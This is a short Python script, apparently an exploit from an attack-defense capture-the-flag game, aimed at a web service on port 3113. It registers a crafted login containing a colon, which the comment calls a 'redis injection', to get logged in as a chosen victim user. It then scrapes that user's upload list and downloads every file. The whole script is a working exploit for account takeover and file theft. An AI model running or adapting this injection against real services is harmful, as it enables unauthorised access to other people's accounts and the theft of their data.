#!/usr/bin/env python3
import sys
import secrets
from requests import Session
import re

ip = sys.argv[1]
hint = sys.argv[2]

url = f'http://{ip}:3113'
find_fileinfo_regexp = re.compile(r'<div class="filenames">(.*)</div>')

login = f"{hint}:fake"
password = login

#get login as "hint" user using redis injection
s = Session()
resp = s.post(url + '/register', data = {'login':login, 'password': password})
resp = s.post(url + '/login', data = {'login':login, 'password': password})

#get file listing for "hint" user
uploads_html = s.get(url + f'/uploads?user={hint}').text
files_info = find_fileinfo_regexp.findall(uploads_html)
filenames = [f"{x.split(': ')[0]}_{x.split(': ')[1]}" for x in files_info]

#download all new files

for filename in filenames:
    print(s.get(url + '/uploads/' + filename).text)